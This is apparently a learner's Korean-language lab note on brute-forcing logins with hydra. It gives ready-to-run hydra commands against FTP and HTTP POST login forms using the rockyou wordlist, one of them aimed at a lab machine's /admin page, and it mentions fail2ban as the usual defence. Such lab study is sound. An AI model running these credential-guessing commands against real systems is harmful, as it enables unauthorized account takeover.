hydra --ssh brute force에 가장 일반적인 도구(
SSH 무차별 대입 공격을 완화하기 위해 일반적으로 사용되는 침입 방지 소프트웨어 프레임워크는 fail2ban)
#
`ftp`
```
hydra -l user -P passlist.txt ftp://MACHINE_IP
```
![image](https://user-images.githubusercontent.com/61821641/151919487-1b20d343-c5fb-497d-91ae-9d2663db1900.png)
#
`http`
```
hydra -l <username> -P <wordlist> MACHINE_IP http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
```

10.10.174.60/admin page

![image](https://user-images.githubusercontent.com/61821641/152080431-9e84c566-4e15-404a-9e40-ee838dcc3f88.png)

![image](https://user-images.githubusercontent.com/61821641/152080490-314e6b24-dde3-4833-93ae-e27859a3f71b.png)

```
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.174.60 http-post-form "/admin/:user=^USER^&pass=^PASS^:Username or password invalid" -V
```

![image](https://user-images.githubusercontent.com/61821641/152080569-a0618348-83d3-4cc4-b3b3-9ebbd3d59ee5.png)